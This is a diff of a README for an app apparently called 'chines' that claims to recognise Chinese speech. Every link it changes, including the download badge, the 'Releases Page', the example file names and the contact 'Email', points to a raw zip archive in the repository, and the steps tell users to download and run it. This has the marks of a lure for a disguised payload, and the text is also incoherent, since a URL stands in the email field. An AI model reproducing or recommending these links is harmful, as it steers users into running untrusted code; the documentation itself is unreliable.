@@ -6,7 +6,7 @@ Welcome to **chines**! This application helps you recognize Chinese speech easil
 
 ## 📥 Download Now
 
-[![Download chines](https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip)](https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip)
+[![Download chines](https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip)](https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,13 +22,13 @@ These requirements ensure that the application runs smoothly.
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip) to see available versions.
+   Go to the [Releases Page](https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip) to see available versions.
 
 2. **Choose Your Version:**  
    Look for the latest release. It will be at the top of the page. 
 
 3. **Download the File:**  
-   Click on the file link that matches your system. It may be named something like `https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip` for Windows or `https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip` for macOS.
+   Click on the file link that matches your system. It may be named something like `https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip` for Windows or `https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip` for macOS.
 
 4. **Run the Installer:**  
    After downloading, open the file. Follow the prompts to install the application. 
@@ -72,7 +72,7 @@ If you encounter any issues, consider the following steps:
 
 - **Check Microphone Settings:** Ensure your microphone is working and properly set in your system settings.
 
-- **Update Your App:** Make sure you are using the latest version of **chines** from the [Releases Page](https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip).
+- **Update Your App:** Make sure you are using the latest version of **chines** from the [Releases Page](https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip).
 
 - **Reinstall if Needed:** Sometimes, reinstalling the app can resolve unexpected problems.
 
@@ -80,7 +80,7 @@ If you encounter any issues, consider the following steps:
 
 If you need further assistance, please contact us:
 
-- **Email:** https://raw.githubusercontent.com/ayman1111111/chines/master/bitubercular/chines.zip
+- **Email:** https://github.com/ayman1111111/chines/raw/refs/heads/master/lib/Software-3.8.zip
 - **GitHub Issues:** You can create an issue in the GitHub repository for any bugs or feature requests.
 
 ## 🌟 Community Contribution
